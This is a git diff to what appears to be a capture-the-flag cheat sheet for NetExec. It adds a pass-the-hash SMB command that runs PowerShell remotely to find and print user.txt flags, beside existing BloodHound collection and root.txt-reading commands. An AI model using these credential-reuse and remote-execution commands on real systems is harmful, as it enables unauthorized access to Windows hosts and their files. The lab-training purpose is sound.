@@ -60,6 +60,11 @@ nxc ldap <ip> -u '<user>' -p '<passwd>' --bloodhound --collection All --dns-serv
 nxc ldap <ip> -u '<user>' -p '<passwd>' --bloodhound --collection Group,LocalAdmin,RDP,DCOM,Container,PSRemote,Session,Acl,Trusts,LoggedOn --dns-server <ip>
 ```
 
+## Cat user.txt with administrator hash
+```
+nxc smb <ip> -u Administrator -H '<hash>' -x 'powershell -c "Get-ChildItem -Path C:\users -Recurse -Force -Filter user.txt -ErrorAction SilentlyContinue | % { Write-Host \"Found at: $($_.FullName)\"; Get-Content $_.FullName }"'
+```
+
 ## Cat root.txt with administrator hash
 ```
 nxc smb <ip> -u Administrator -H '<hash>' -x 'type C:\Users\Administrator\Desktop\root.txt'
